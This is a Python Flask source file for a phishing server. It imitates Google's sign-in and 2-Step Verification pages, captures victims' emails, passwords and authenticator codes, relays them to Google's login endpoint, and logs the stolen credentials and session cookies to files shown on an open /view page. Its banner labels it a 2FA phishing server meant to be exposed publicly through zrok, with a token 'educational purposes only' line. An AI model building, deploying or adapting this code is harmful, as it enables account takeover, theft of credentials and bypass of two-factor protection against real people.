from flask import Flask, request, render_template_string, session, redirect, jsonify
import requests
from datetime import datetime
import json
import secrets
import os
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Store pending 2FA sessions
pending_sessions = {}

# REAL Google endpoints
GOOGLE_AUTH = "https://accounts.google.com/ServiceLoginAuth"

# ============ HTML PAGES ============
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .input-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 1px 3px rgba(26,115,232,0.3); }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
        .btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png">
            </div>
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            <form method="POST" action="/login">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email or phone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="footer">
                <a href="#">Create account</a> · <a href="#">Forgot email?</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

TFA_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>2-Step Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; }
        .subtitle { color: #5f6368; text-align: center; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 24px; text-align: center; letter-spacing: 8px; }
        .input-group input:focus { border-color: #1a73e8; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
        .btn:hover { background: #1557b0; }
        .timer { text-align: center; color: #999; font-size: 12px; margin-top: 15px; }
        .error { color: #d93025; text-align: center; margin-bottom: 10px; display: none; }
        .footer { margin-top: 20px; text-align: center; color: #5f6368; font-size: 14px; }
        .footer a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png">
            </div>
            <h1 class="title">Verify it's you</h1>
            <p class="subtitle">Enter the verification code from your authenticator app</p>
            <div id="error" class="error">Invalid code. Please try again.</div>
            <form method="POST" action="/2fa_complete">
                <div class="input-group">
                    <input type="text" name="code" placeholder="000000" maxlength="6" autofocus required>
                </div>
                <button type="submit" class="btn">Verify</button>
            </form>
            <div class="timer" id="timer">Code expires in: 30 seconds</div>
            <div class="footer">
                <a href="#">Try another way</a>
            </div>
        </div>
    </div>
    <script>
        let timeLeft = 30;
        const timerElement = document.getElementById('timer');
        const interval = setInterval(() => {
            timeLeft--;
            timerElement.textContent = `Code expires in: ${timeLeft} seconds`;
            if (timeLeft <= 0) {
                clearInterval(interval);
                timerElement.textContent = 'Code expired! Please request a new one.';
                timerElement.style.color = '#d93025';
            }
        }, 1000);
    </script>
</body>
</html>
'''

SUCCESS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://mail.google.com">
    <title>Redirecting...</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 100px; background: #fff; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .title { color: #202124; font-size: 24px; }
        .subtitle { color: #5f6368; font-size: 16px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 class="title">Signing you in...</h2>
    <p class="subtitle">Please wait while we redirect you to Gmail</p>
</body>
</html>
'''

# ============ ROUTES ============
@app.route('/')
def index():
    print(f"[+] New visitor at: {datetime.now()}")
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def process_login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    print(f"\n{'='*60}")
    print(f"[+] LOGIN ATTEMPT at: {datetime.now()}")
    print(f"[+] Email: {email}")
    print(f"[+] Password: {password}")
    print(f"[+] IP: {request.remote_addr}")
    print(f"[+] User-Agent: {request.headers.get('User-Agent', 'Unknown')[:50]}...")
    
    # Create session
    victim_session = requests.Session()
    
    try:
        # Forward to real Google
        google_response = victim_session.post(
            GOOGLE_AUTH,
            data={
                'Email': email,
                'Passwd': password,
                'service': 'mail',
                'continue': 'https://mail.google.com'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            allow_redirects=False,
            timeout=10
        )
        
        # Save credentials
        with open('captured_creds.txt', 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"IP: {request.remote_addr}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'='*60}\n")
        
        print(f"[+] Credentials saved to captured_creds.txt")
        
        # Check if 2FA required
        if google_response.status_code == 302:
            location = google_response.headers.get('Location', '')
            
            if 'challenge' in location or '2fa' in location or 'two-step' in location:
                # 2FA required
                session_id = secrets.token_hex(16)
                
                pending_sessions[session_id] = {
                    'cookies': victim_session.cookies.get_dict(),
                    'email': email,
                    'password': password,
                    'timestamp': datetime.now().isoformat(),
                    'session': victim_session
                }
                
                session['pending_session_id'] = session_id
                session['email'] = email
                
                print(f"[!] 2FA Required for: {email}")
                print(f"[!] Waiting for 2FA code...")
                print(f"[!] Session ID: {session_id}")
                print(f"{'='*60}")
                
                return render_template_string(TFA_PAGE)
        
        # No 2FA - direct access
        cookies = victim_session.cookies.get_dict()
        with open('no_2fa_session.txt', 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"Email: {email}\n")
            f.write(f"NO 2FA - Full Access\n")
            f.write(f"Cookies: {json.dumps(cookies, indent=2)}\n")
            f.write(f"{'='*60}\n")
        
        print(f"[+] No 2FA required - Session captured!")
        print(f"{'='*60}")
        return render_template_string(SUCCESS_PAGE)
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/2fa_complete', methods=['POST'])
def complete_2fa():
    code = request.form.get('code')
    session_id = session.get('pending_session_id')
    email = session.get('email')
    
    print(f"\n{'='*60}")
    print(f"[!] 2FA CODE RECEIVED at: {datetime.now()}")
    print(f"[!] Code: {code}")
    print(f"[!] Email: {email}")
    print(f"[!] Completing login...")
    
    if session_id not in pending_sessions:
        print("[!] Session expired!")
        return "Session expired. Please try again."
    
    saved_data = pending_sessions[session_id]
    victim_session = saved_data['session']
    
    # MEASURE FORWARDING TIME
    start_time = time.perf_counter()
    
    try:
        # Forward 2FA code IMMEDIATELY
        final_response = victim_session.post(
            GOOGLE_AUTH,
            data={
                'Email': saved_data['email'],
                'Passwd': saved_data['password'],
                '2fa_code': code,
                'continue': 'https://mail.google.com',
                'service': 'mail'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            allow_redirects=False,
            timeout=10
        )
        
        # Calculate forwarding time
        elapsed_time = (time.perf_counter() - start_time) * 1000  # milliseconds
        
        authenticated_cookies = victim_session.cookies.get_dict()
        
        # Check for auth cookies
        auth_cookies = ['SAPISID', 'APISID', 'HSID', 'SSID']
        has_auth = any(cookie in authenticated_cookies for cookie in auth_cookies)
        
        if has_auth or final_response.status_code == 302:
            # SUCCESS!
            with open('2fa_success.txt', 'a') as f:
                f.write("\n" + "="*60)
                f.write(f"\n[!!!] FULL ACCESS WITH 2FA\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"Email: {saved_data['email']}\n")
                f.write(f"Password: {saved_data['password']}\n")
                f.write(f"2FA Code: {code}\n")
                f.write(f"Forwarding Time: {elapsed_time:.2f}ms\n")
                f.write(f"Cookies: {json.dumps(authenticated_cookies, indent=2)}\n")
                f.write("="*60 + "\n")
            
            print(f"\n[!!!] ✅ SUCCESS! Full access acquired!")
            print(f"[!!!] Email: {saved_data['email']}")
            print(f"[!!!] 2FA Code: {code}")
            print(f"[!!!] Forwarding Time: {elapsed_time:.2f}ms")
            print(f"[!!!] Cookies saved in: 2fa_success.txt")
            print(f"{'='*60}")
            
            # Clean up
            del pending_sessions[session_id]
            
            return render_template_string(SUCCESS_PAGE)
            
        else:
            print(f"[!] ❌ 2FA failed for: {saved_data['email']}")
            print(f"{'='*60}")
            return '''
            <html>
            <body style="font-family: Arial; text-align: center; padding-top: 50px; background: #fff;">
                <h2 style="color: #d93025;">Invalid verification code</h2>
                <p>The code you entered is incorrect or has expired.</p>
                <p><a href="/" style="color: #1a73e8;">Try again</a></p>
            </body>
            </html>
            '''
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/view')
def view_captured():
    output = []
    files = ['captured_creds.txt', 'no_2fa_session.txt', '2fa_success.txt']
    for f in files:
        try:
            with open(f, 'r') as file:
                output.append(f"\n{'='*60}\n")
                output.append(f"📁 FILE: {f}\n")
                output.append(f"{'='*60}\n")
                output.append(file.read())
        except:
            output.append(f"\n📁 {f}: No data captured yet\n")
    
    return f'<pre style="font-family: monospace; font-size: 12px; background: #f5f5f5; padding: 20px;">{"".join(output)}</pre>'

@app.route('/stats')
def stats():
    """Simple stats page"""
    stats_data = {
        'pending_sessions': len(pending_sessions),
        'active': True,
        'time': datetime.now().isoformat()
    }
    
    # Count captured credentials
    try:
        with open('captured_creds.txt', 'r') as f:
            cred_count = f.read().count('Email:')
        stats_data['credentials_captured'] = cred_count
    except:
        stats_data['credentials_captured'] = 0
    
    # Count 2FA successes
    try:
        with open('2fa_success.txt', 'r') as f:
            success_count = f.read().count('[!!!]')
        stats_data['2fa_successes'] = success_count
    except:
        stats_data['2fa_successes'] = 0
    
    return jsonify(stats_data)

if __name__ == '__main__':
    # Create files if they don't exist
    for f in ['captured_creds.txt', 'no_2fa_session.txt', '2fa_success.txt']:
        if not os.path.exists(f):
            with open(f, 'w') as file:
                file.write(f"=== {f.replace('.txt', '').upper()} ===\n")
                file.write(f"Created: {datetime.now()}\n\n")
    
    print("\n" + "="*60)
    print("🔐 2FA PHISHING SERVER - READY FOR ZROK")
    print("="*60)
    print(f"📁 Login Page: http://localhost:5000/")
    print(f"📁 View Data: http://localhost:5000/view")
    print(f"📁 Stats: http://localhost:5000/stats")
    print("="*60)
    print("\n[!] IMPORTANT: Use with zrok:")
    print("    zrok share public http://localhost:5000")
    print("\n[!] This is for EDUCATIONAL PURPOSES ONLY!")
    print("[!] Only test on your OWN accounts!")
    print("\n[+] Server starting...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
